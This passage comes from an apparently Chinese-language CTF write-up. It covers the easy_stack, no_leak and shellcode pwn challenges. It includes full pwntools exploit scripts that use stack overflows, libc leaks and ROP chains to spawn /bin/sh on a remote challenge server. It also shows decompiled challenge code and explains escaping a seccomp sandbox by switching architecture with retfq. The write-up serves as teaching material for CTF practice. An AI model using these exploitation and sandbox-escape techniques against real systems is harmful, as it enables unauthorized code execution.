class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./easy_stack&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p16(<span class="number">0x80</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21A80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + flat(libc_base+<span class="number">0x415a6</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="no-leak"><a href="#no-leak" class="headerlink" title="no leak"></a>no leak</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>这里吐槽一下这个平台，给的libc不是常见libc，并且也不给ld文件，上面一道可以泄漏还好这个无法泄漏只能爆破偏移，太浪费时间了，基本就是盲调。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，就只有简单的栈溢出，并且不存在任何的输出函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221014184632346.png"                      alt="image-20221014184632346"                ></p><p>这里还有一个吐槽点，因为程序保护是<code>Full RELRO</code>所以走ret2resolve是行不通的，所以下意识就是去找gadget。这里的吐槽点就是在ida和ROPgadget里面都找到有用的gadget是在ropper导出的内容才找到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0000000000400518: add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br></pre></td></tr></table></figure><p>这里依旧需要熟知程序的运行机制，在上面一道题中我们提到了，程序开始时<code>_start</code>=&gt;<code>__libc_start_main</code>=&gt;<code>main</code>，在最后这里进入main时是用call进入的，所以会在栈上残留下<code>__libc_start_main+231</code>的地址，不过这里因为我们要持续劫持执行流所以我们不能利用这里，不过这里依旧存在很多可以用的，这里就不再赘述，可以自己看一下<code>__libc_start_main</code>的函数代码。</p><h3 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h3><p>看得出来上面的gadget是可以修改任意地址上内容的值，所以如果我们在已知地址上放上libc地址即可根据偏移得到system的地址，最后通过csu来call已知位置即可。</p><p>最后得出的思路就是：</p><p><code>栈迁移到bss段</code>=&gt;<code>在bss布置rop进行csu调用__libc_start_main</code>=&gt;<code>在__libc_start_main中调用read覆盖栈</code>=&gt;<code>使用gadget修改残留位置指向system并用csu调用</code></p><h3 id="综上，exp-1"><a href="#综上，exp-1" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./no_leak&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./no_leak&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;nc.eonew.cn&#x27;</span>, <span class="number">10002</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">bss = elf.bss()+<span class="number">0x500</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">_start = <span class="number">0x400474</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004005d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004005d1</span></span><br><span class="line"><span class="comment"># add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span></span><br><span class="line">gadget = <span class="number">0x0000000000400518</span></span><br><span class="line">pop_rbp = <span class="number">0x00000000004004b8</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15 = <span class="number">0x4005CA</span></span><br><span class="line">one_gadget = <span class="number">0x41720</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*&#x27;+hex(elf.plt[&#x27;read&#x27;]))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+flat(bss, pop_rdi, <span class="number">0</span>, pop_rsi_r15,</span><br><span class="line">                         bss, <span class="number">0</span>, elf.plt[<span class="string">&#x27;read&#x27;</span>], <span class="number">0x400564</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">payload = flat(<span class="number">0x196082</span>, <span class="number">0x4005CA</span>, (one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>, (one_gadget-<span class="number">0x21a87</span>),</span><br><span class="line">               (<span class="number">0x601558</span> - (((one_gadget-<span class="number">0x21a87</span>)-<span class="number">1</span>)*<span class="number">8</span>)), elf.symbols[<span class="string">&#x27;read&#x27;</span>], <span class="number">0</span>, <span class="number">0x601488</span>, <span class="number">0x4005B0</span>, _start)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">bin_sh_addr = <span class="number">0x601488</span>+<span class="number">0x90</span>+<span class="number">8</span></span><br><span class="line">payload = flat(pop_rbx_rbp_r12_r13_r14_r15,</span><br><span class="line">               -<span class="number">0x371f08</span>, [<span class="number">0</span>]*<span class="number">5</span>, pop_rbp, <span class="number">0x601448</span>+<span class="number">0x3d</span>, gadget, <span class="number">0x4005CA</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0x601448</span>, bin_sh_addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000000000400416</span>, <span class="number">0x4005B0</span>)</span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.sendline(p64(main))</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>在以往遇到沙箱的问题都是使用ORW，并且只是常规的进行调用，并没有更加深层次的讨论。这里就借此题目更加深入讨论一下在CTF中常见的沙箱保护以及绕过方式。</p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r12d</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg3[<span class="number">2</span>]; <span class="comment">// [rsp+80h] [rbp-80h] BYREF</span></span><br><span class="line">  __int16 v13; <span class="comment">// [rsp+90h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+92h] [rbp-6Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+93h] [rbp-6Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+94h] [rbp-6Ch]</span></span><br><span class="line">  __int16 v17; <span class="comment">// [rsp+98h] [rbp-68h]</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+9Ah] [rbp-66h]</span></span><br><span class="line">  <span class="keyword">char</span> v19; <span class="comment">// [rsp+9Bh] [rbp-65h]</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// [rsp+9Ch] [rbp-64h]</span></span><br><span class="line">  __int16 v21; <span class="comment">// [rsp+A0h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v22; <span class="comment">// [rsp+A2h] [rbp-5Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+A3h] [rbp-5Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// [rsp+A4h] [rbp-5Ch]</span></span><br><span class="line">  __int16 v25; <span class="comment">// [rsp+A8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+AAh] [rbp-56h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+ABh] [rbp-55h]</span></span><br><span class="line">  <span class="keyword">int</span> v28; <span class="comment">// [rsp+ACh] [rbp-54h]</span></span><br><span class="line">  __int16 v29; <span class="comment">// [rsp+B0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> v30; <span class="comment">// [rsp+B2h] [rbp-4Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v31; <span class="comment">// [rsp+B3h] [rbp-4Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v32; <span class="comment">// [rsp+B4h] [rbp-4Ch]</span></span><br><span class="line">  __int16 v33; <span class="comment">// [rsp+B8h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> v34; <span class="comment">// [rsp+BAh] [rbp-46h]</span></span><br><span class="line">  <span class="keyword">char</span> v35; <span class="comment">// [rsp+BBh] [rbp-45h]</span></span><br><span class="line">  <span class="keyword">int</span> v36; <span class="comment">// [rsp+BCh] [rbp-44h]</span></span><br><span class="line">  __int16 v37; <span class="comment">// [rsp+C0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> v38; <span class="comment">// [rsp+C2h] [rbp-3Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v39; <span class="comment">// [rsp+C3h] [rbp-3Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v40; <span class="comment">// [rsp+C4h] [rbp-3Ch]</span></span><br><span class="line">  __int16 v41; <span class="comment">// [rsp+C8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> v42; <span class="comment">// [rsp+CAh] [rbp-36h]</span></span><br><span class="line">  <span class="keyword">char</span> v43; <span class="comment">// [rsp+CBh] [rbp-35h]</span></span><br><span class="line">  <span class="keyword">int</span> v44; <span class="comment">// [rsp+CCh] [rbp-34h]</span></span><br><span class="line">  __int16 v45; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v46; <span class="comment">// [rsp+D2h] [rbp-2Eh]</span></span><br><span class="line">  <span class="keyword">char</span> v47; <span class="comment">// [rsp+D3h] [rbp-2Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v48; <span class="comment">// [rsp+D4h] [rbp-2Ch]</span></span><br><span class="line"></span><br><span class="line">  v13 = <span class="number">32</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">21</span>;</span><br><span class="line">  v18 = <span class="number">6</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">5</span>;</span><br><span class="line">  v21 = <span class="number">21</span>;</span><br><span class="line">  v22 = <span class="number">5</span>;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v24 = <span class="number">37</span>;</span><br><span class="line">  v25 = <span class="number">21</span>;</span><br><span class="line">  v26 = <span class="number">4</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">1</span>;</span><br><span class="line">  v29 = <span class="number">21</span>;</span><br><span class="line">  v30 = <span class="number">3</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">21</span>;</span><br><span class="line">  v34 = <span class="number">2</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">9</span>;</span><br><span class="line">  v37 = <span class="number">21</span>;</span><br><span class="line">  v38 = <span class="number">1</span>;</span><br><span class="line">  v39 = <span class="number">0</span>;</span><br><span class="line">  v40 = <span class="number">231</span>;</span><br><span class="line">  v41 = <span class="number">6</span>;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v43 = <span class="number">0</span>;</span><br><span class="line">  v44 = <span class="number">0</span>;</span><br><span class="line">  v45 = <span class="number">6</span>;</span><br><span class="line">  v46 = <span class="number">0</span>;</span><br><span class="line">  v47 = <span class="number">0</span>;</span><br><span class="line">  v48 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(arg3[<span class="number">0</span>]) = <span class="number">9</span>;</span><br><span class="line">  arg3[<span class="number">1</span>] = (<span class="keyword">unsigned</span> __int64)&amp;v13;</span><br><span class="line">  v0 = sys_alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  v1 = sys_write(<span class="number">1u</span>, <span class="string">&quot;---------- Shellcode ----------\n&quot;</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  v2 = sys_prctl(<span class="number">38</span>, <span class="number">1uLL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = sys_prctl(<span class="number">22</span>, <span class="number">2uLL</span>, (<span class="keyword">unsigned</span> __int64)arg3, v3);</span><br><span class="line">  v5 = (<span class="keyword">char</span> *)sys_mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7uLL</span>, <span class="number">0x22</span>uLL, <span class="number">0xFFFFFFFF</span>uLL, <span class="number">0LL</span>);</span><br><span class="line">  v6 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Input your shellcode: &quot;</span>, <span class="number">0x16</span>uLL);</span><br><span class="line">  v7 = sys_read(<span class="number">0</span>, v5, <span class="number">0x1000</span>uLL);</span><br><span class="line">  v8 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] == <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[(<span class="keyword">int</span>)v7 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    v8 = v7 - <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5[i] &lt;= <span class="number">0x1F</span> || v5[i] == <span class="number">0x7F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = sys_write(<span class="number">1u</span>, <span class="string">&quot;Check!\n&quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))v5)();</span><br><span class="line">LABEL_10:</span><br><span class="line">  v11 = sys_exit_group(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目很简单，限制了输入的shellcode为可见字符，这里虽然ida翻译为了<code>if ( v5[i] &lt;= 0x1F || v5[i] == 0x7F )</code>不过在实际调试过程中发现就是不允许大于<code>0x7f</code>，上面开启了sandbox。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment"># seccomp-tools dump ./shellcode</span></span><br><span class="line">---------- Shellcode ----------</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x06 0x00 0x00000005  <span class="keyword">if</span> (A == fstat) goto 0008</span><br><span class="line"> 0002: 0x15 0x05 0x00 0x00000025  <span class="keyword">if</span> (A == alarm) goto 0008</span><br><span class="line"> 0003: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == write) goto 0008</span><br><span class="line"> 0004: 0x15 0x03 0x00 0x00000000  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000009  <span class="keyword">if</span> (A == mmap) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x000000e7  <span class="keyword">if</span> (A == exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x00000000  <span class="built_in">return</span> KILL</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br><span class="line">root@0df3326fd7c0:/ctf/work/download <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>如果按照我以往的思维方式会认为这道题目是没法完成的，应为没有open调用。所以下面就讲解一下sandbox的一些利用技巧。</p><h3 id="sandbox绕过"><a href="#sandbox绕过" class="headerlink" title="sandbox绕过"></a>sandbox绕过</h3><p>这里拿一个平时十分常见的沙箱规则做讲解：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x09</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x06</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000003</span>  <span class="keyword">if</span> (A == close) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><p>这个沙箱规则是非常简单的，可以看到可以直接进行ORW获得flag。</p><p>可以看到这里前面两行做了一个判断，这个判断的效果就是判断当前的架构是否为<code>amd64</code>，如果不是可以看到直接会被kill掉。接着下面两行是验证<code>sys_number</code>的需要小于<code>0x40000000</code>。</p><p>下面主要讲解如果不存上述两条判断的情况，以及一种额外的绕过方式。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>这里用题目的沙箱规则做讲解。可以看到这里不存在架构的判断，并且也不存在<code>sys_number</code>大小的判断。不过可以看出来这里不能使用<code>sysnumber+0x40000000</code>的方式来绕过，因为这里判断调用号都不满足时就会直接KILL掉。不过这里可以使用进入x86架构来绕过。</p><p>首先要知道，程序是怎么知道要以64位模式运行还是以32位模式运行的；寄存器中有一个cs寄存器，cs = 0x23代表32位模式，cs = 0x33代表64位模式，而cs寄存器就是通过上面提到的<code>retfq</code>汇编指令来修改。</p><p>然后再深扒一下<code>retfq</code>指令，这一指令其实存在的是两步，分别是:<code>ret; mov cs, [rsp + 8]</code>所以如果我们事先控制了栈上的内容即可实现切换架构。</p><p>再看一下没有<code>sys_number</code>检验的沙箱规则</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span 